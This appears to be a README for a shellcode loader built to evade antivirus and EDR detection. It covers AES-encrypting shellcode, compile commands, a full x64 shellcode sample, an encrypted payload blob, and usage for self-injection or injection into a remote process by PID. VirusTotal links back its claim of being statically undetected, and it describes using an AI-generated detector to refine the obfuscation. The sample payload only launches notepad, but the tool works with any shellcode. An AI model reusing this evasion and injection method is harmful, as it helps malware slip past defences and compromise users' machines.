#

First test : https://www.virustotal.com/gui/file/5757fe3deb98fc892b237ab370dc9cc51747b781e74e53e52cb2a907f1b32039

Static analysis bypass : 

use encrypt.exe
compile command: (with mingw)
gcc -o encrypt.exe better_encrypt.c -I"C:\msys64\mingw64\include" -L"C:\msys64\mingw64\lib" -funroll-loops -O3 -lssl -lcrypto

Usage example : 
./encrypt.exe \xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x22\x65\x63\x68\x6f\x20\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x22\x20\x26\x20\x73\x74\x61\x72\x74\x20\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00 aes_key.bin aed_iv.bin out.hex

The hex encrypted shellcode should be in out.hex

If you don't have the executable compiled, use "make" to compile it. You must have msvcpp installed and opensll. You will probably need to use your own paths for libs & includes.

Then we can just use the compiled executable with arg1 = encrypted shellcode and arg2 = "L$ L" for self-injection or " L$ H" for remote process execution and arg3 (optional) = process id if injecting into remote.

Example : 

./program.x64.exe 8747d8dbab8655092c1c87ac887183315327cb55f3f4b473879e13dc0d3702c97a3e82b2d1b20719e4306953b623d6460e9d83e1af4cc2d8bd190a2fde75970979ee7a7a716a6b69d882fc5fec426b7d024a7abb391b8b420e25d8a54a3facd0aa2e84890d1f15731c52f18301e1913fa1b415061c5a4affba1e724ee96d16cdc1033d1da316d1b8d8b1360e621ddc7ed138db7fd864b33450c825635705f8306e2cbe261b40c17cfe480f9b266534b812efb9dc993ae802511f18498b5df3e5283d3bde072b97b332376d76dcb4f0c74234345da40f4d3b5b3697b611cb1e70a20c56e8a595ce399aa7211ecb619a375b635022508c33393bd6a3704a6b04496e80bd668bb09fe4b21969068de8c31fdbe0ba41103bced5b141e049fdaa7650b2c2a4a0ac841525dd1228dfa2ad7f92e0bedd42e8a8d76e8529e85f1dd4488c413388319f132835544324ac8e160022188373e41b8e67b9ff823f4edde99ca2e2c2acdc4c15ba05ec0faf86b3fd776f8b505d1fb379da847523e3c4da5ddd78c8ea0afb5cf435d78023ec8c6d2339d9aedd251effc8d1e650f6f31c200ae68bac4e1bf3892f64fc022d3a63d54aaac7bbe97102e8361669c48d4a2cda3661a5c92e2ef931352bf9e2ebdb2303bdfed30762a7456b50e5f5d92a07dde2f211f7469a3f1e65a67dd01756cbe67588a8a36d99e91f5d122c14a8edd21fc92ac696cc6606ca96da75345605f3df44c4e5f6a8ecd6891b42ca663af2cc652ffa70dd3f109a5d4c3c99e289f00b6b05eb944599916bc5c496b83c4d166b79266828db146c938611beb705b1d33623715b9c100c9eb319f87d24044637bdaa7e5ece71df39dba9e4ae909ee5c611f2d5959f6a95380319f03545cd09f9aea1933f404447ed1c06a7f9d641bcd665847b1cfd20445f2e3f37fbdf0387e5fc0c3f109de1ffdeca51ebcc8dfa17f27716450036928c91ed7caa34c9798bc5f416f474d0ecc7eb55e2e749cd21f46243167b22f849631efe638e708943e29d137637e723059ef4be6ea0ebfb79610add61c77bbbda772e994c488f7e312fac222d0884105f3d921de3c0e16dab1dac1d2d4c0ae4a9e559c3efe999bd5e57d181adf58e21cf9e2bca2b92977f581a1db7b773c272d841a5d8f1332003dbf8ebd0d3f811cf82e30a8d182bfbe95dec2042c30b77714b1697a244cd63444c7689ed954cfd8a8cf7f05ef1ffad6b3b2da13f915db57dcc412e6441f37d96ba342ac20b572d3ea484e2cb02695f7da5ad71adc07893f30f8c43bd8caa5c949650aa27a1a70908167be5ce1a70355cbbe75330c646ab6073e02fb3e5faef2af12b095fef6cbe52e16ec3db66bface0e47d76f88aa5333d0a0702ec2cb47d390f3bb0c56cbe406ffe859d5fbf33a20a40343a8e3d4453961ea7c3aa56b2c482f692c247c0715812c2d816266fa11bedf6e2942fce60d0c7851711a1894aadcfecd358ff76b2e8512124baafee64f27a917ae5ee3432e360f286d72c0d3e4d3e43e9c4dd2b655a3bbed780537ca9457d786755e1dd4cd985f48f21af80c4d561cb636a993157ee1027d9b7ff1b2adad3862f181a15e160d33a5209f3f8761dc1dbfcd50496761855fb27e762def885b9611eba0676aa804c103c4dd9254849ade041359b3c755af8eef477090e814c09f8a6342834a06b2abfbb2aee46702ab0571781a41478d4be11855e2fa886a04956941c72aff785b19f0f7f631d69e8e481e1ce7b6b75d80cb10dce615801e1695353be53abd9cb7f4c6f0bd820838f967e80866cfa680c1a75 local

Now, we are statically undetected

Behaviour is still somewhat suspicious here.

Static analysis evasion :

https://www.virustotal.com/gui/file/c4ba78085b1736986e34cf07c674f75ab71a49b6401782b272b338140bb23fcf

We can use the "analyzer.py" (AI generated detector), to understand better what AVs and EDRs could look in our program to try to obfuscate it better.



